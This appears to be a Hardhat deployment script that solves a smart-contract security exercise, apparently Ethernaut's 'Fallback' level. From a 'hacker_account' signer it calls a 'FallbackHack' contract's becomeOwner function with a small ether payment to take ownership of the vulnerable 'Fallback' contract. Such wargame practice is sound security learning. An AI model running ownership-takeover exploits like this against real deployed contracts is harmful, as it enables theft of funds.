
const { use, util } = require("chai");
const { utils } = require("ethers");
const { ethers } = require("hardhat");
const hre = require("hardhat")
const config = require("./fb_contract_config.json")

async function main() {

  let deployer, hacker_account

  const account = await ethers.getSigners()

  deployer = account[0]
  hacker_account = account[1]

  console.log("Hacker account")

  const {chainId} = await ethers.provider.getNetwork()
  console.log(chainId)

  console.log("FallbackHack Contract address: ", config[chainId].FallbackHack.address)
  console.log("Fallback Contract address: ", config[chainId].Fallback.address)
  
  const fbc_contract = await ethers.getContractAt("FallbackHack", config[chainId].FallbackHack.address);
  const fb_contract = await ethers.getContractAt("contracts/Fallback.sol:Fallback", config[chainId].Fallback.address);
  let fbc_addr = String(fbc_contract.address)
  let fun_owner = await fbc_contract.connect(hacker_account).becomeOwner({value: ethers.utils.parseEther("0.0009")})

}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});